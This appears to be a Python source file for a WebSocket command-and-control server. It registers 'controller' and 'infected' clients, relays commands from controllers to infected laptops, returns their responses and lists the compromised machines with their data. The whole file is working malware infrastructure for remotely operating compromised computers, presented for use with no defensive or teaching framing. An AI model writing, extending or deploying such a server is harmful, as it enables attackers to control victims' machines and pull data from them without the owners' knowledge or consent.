import asyncio  # Import asyncio for handling asynchronous operations
import websockets  # Import websockets for WebSocket communication
import json  # Import json for handling JSON serialization/deserialization
import uuid  # Import uuid for generating unique identifiers
import logging  # Import logging for logging messages
import socket  # Import socket for network communication
from datetime import datetime, timedelta  # Import datetime and timedelta for handling date and time operations
from pythonjsonlogger import jsonlogger  # Import jsonlogger for formatting log messages as JSON

# Configure logging
log_handler = logging.StreamHandler()  # Create a logging handler that outputs to the console
formatter = jsonlogger.JsonFormatter()  # Use JSON formatter for logging
log_handler.setFormatter(formatter)  # Set the formatter for the logging handler

logger = logging.getLogger()  # Get the root logger
logger.setLevel(logging.DEBUG)  # Set the logging level to DEBUG to capture all log messages
logger.addHandler(log_handler)  # Add the handler to the logger

# Store connected computers and messages
clients = {}  # Dictionary to store connected clients
messages = []  # List to store messages between clients

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)  # Define how long messages are kept before being cleaned up


# Utility function to clean up old messages
def cleanup_old_messages():
    global messages  # Use the global messages variable
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD  # Calculate the cutoff time for message retention
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]  # Keep only messages newer than the cutoff time
    logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})  # Log the cleanup operation


# Assign a unique ID to each new connection
async def register_client(websocket, role, client_id, data=None):
    clients[client_id] = {
        'websocket': websocket,  # Store the WebSocket connection for the client
        'last_seen': datetime.now(),  # Record the last seen time for the client
        'role': role,  # Store the role of the client (e.g., controller, infected)
        'data': data,  # Store any additional data if available
        'messages': []  # Initialize an empty list for storing messages related to the client
    }
    logger.info("Registered new client.", extra={"role": role, "client_id": client_id, "data": data})  # Log client registration


# Relay messages between control and infected laptops
async def relay_messages(websocket, client_id, role):
    while True:
        try:
            message = await websocket.recv()  # Wait for a message from the client
            data = json.loads(message)  # Parse the message as JSON
            logger.info("Received message from client.", extra={"client_id": client_id, "role": role, "data": data})  # Log the received message

            cleanup_old_messages()  # Clean up old messages before processing new ones

            if data.get("type") == "command" and role == "controller":  # Handle commands from a controller
                target_id = data['target']  # Get the target client ID
                command = data['command']  # Get the command to be sent
                command_type = data['command_type']  # Get the type of command

                logger.info("Processing command.", extra={"target_id": target_id, "command": command})  # Log the command processing

                if target_id in clients and clients[target_id]['role'] == 'infected':  # Check if the target client is connected and is an infected machine
                    target_ws = clients[target_id]['websocket']  # Get the WebSocket of the target client
                    command_id = str(uuid.uuid4())  # Generate a unique ID for the command
                    command_time = datetime.now()  # Record the current time for the command

                    new_message = {
                        'id': command_id,  # Unique ID for the command
                        'origin': client_id,  # Origin client ID (controller)
                        'target': target_id,  # Target client ID (infected)
                        'command_time': command_time,  # Time when the command was issued
                        'response_time': None,  # Initialize response time as None
                        'type': command_type,  # Type of command
                        'command': command,  # Command details
                        'response': None  # Initialize response as None
                    }

                    await target_ws.send(json.dumps(new_message))  # Send the command to the target client
                    messages.append(new_message)  # Store the command message in the message list
                    logger.info("Command sent to target.", extra={"target_id": target_id, "message": new_message})  # Log the command sending
                else:
                    logger.warning("Target not connected.", extra={"target_id": target_id})  # Log if the target client is not connected

            elif data.get("type") == "response" and role == "infected":  # Handle responses from an infected client
                command_id = data['command_id']  # Get the command ID for which the response is sent
                response = data['response']  # Get the response details
                logger.info("Processing response for command ID.",
                            extra={"command_id": command_id, "response": response})  # Log the response processing

                # Find the original command and update it with the response
                for msg in messages:
                    if msg['id'] == command_id:  # Find the message with the matching command ID
                        msg['response'] = response  # Update the message with the response
                        msg['response_time'] = datetime.now()  # Record the response time
                        logger.info("Updated message with response.", extra={"msg": msg})  # Log the message update
                        break

                origin_id = msg['origin']  # Get the origin client ID
                if origin_id in clients:
                    origin_ws = clients[origin_id]['websocket']  # Get the WebSocket of the origin client
                    await origin_ws.send(json.dumps(msg))  # Send the updated message back to the origin client
                    logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})  # Log the response relaying

            elif data.get("type") == "request_client_list" and role == "controller":  # Handle client list requests from a controller
                # Prepare a list of clients for the controller
                clients_list = {
                    client_id: {
                        'last_seen': client['last_seen'],  # Last seen time of the client
                        'role': client['role'],  # Role of the client (e.g., controller, infected)
                        'data': client.get('data', {})  # Additional data about the client
                    }
                    for client_id, client in clients.items()
                }

                response = {'type': 'infected_list', 'infected_laptops': clients_list}  # Create a response with the list of infected clients
                await websocket.send(json.dumps(response))  # Send the client list to the controller
                logger.info("Sent client list to controller.", extra={"clients_list": clients_list})  # Log the client list sending

        except websockets.ConnectionClosed:  # Handle WebSocket connection closed
            logger.info("Client disconnected.", extra={"client_id": client_id, "role": role})  # Log the client disconnection
            del clients[client_id]  # Remove the client from the clients dictionary
            break
        except Exception as e:  # Handle other exceptions
            logger.error("Exception occurred.", exc_info=True, extra={"client_id": client_id})  # Log the exception details


# Handle new connections
async def connection_handler(websocket, path):
    client_id = None  # Initialize client ID as None
    try:
        initial_message = await websocket.recv()  # Wait for the initial message from the client
        initial_data = json.loads(initial_message)  # Parse the initial message as JSON

        role = initial_data['role']  # Get the role of the client (e.g., controller, infected)
        client_id = initial_data['id']  # Get the client ID from the initial data
        data = initial_data.get('data') if role == 'infected' else None  # Get additional data if available (only for infected clients)

        await register_client(websocket, role, client_id, data)  # Register the client
        await relay_messages(websocket, client_id, role)  # Start relaying messages for the client
    except websockets.ConnectionClosed:  # Handle WebSocket connection closed
        logger.info("Connection closed for client.", extra={"client_id": client_id if client_id else 'unknown'})  # Log the connection closure
        if client_id in clients:
            del clients[client_id]  # Remove the client from the clients dictionary
    except Exception as e:  # Handle other exceptions
        logger.error("Exception occurred in connection handler.", exc_info=True)  # Log the exception details


# Function to get the local IP address of the server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create a socket for IP address resolution
    try:
        s.connect(("8.8.8.8", 80))  # Connect to an external server to determine the local IP address
        ip = s.getsockname()[0]  # Get the local IP address
    except Exception:
        ip = "127.0.0.1"  # Default to localhost if unable to determine IP address
    finally:
        s.close()  # Close the socket
    return ip  # Return the determined IP address


# Start the WebSocket server
async def main():
    ip_address = get_local_ip()  # Get the local IP address of the server
    port = 6857  # Set the port for the WebSocket server

    logger.info("Server listening.", extra={"ip": ip_address, "port": port})  # Log server start

    async with websockets.serve(connection_handler, "0.0.0.0", port):  # Start the WebSocket server to handle connections
        await asyncio.Future()  # Run forever


if __name__ == "__main__":
    asyncio.run(main())  # Run the main function to start the server
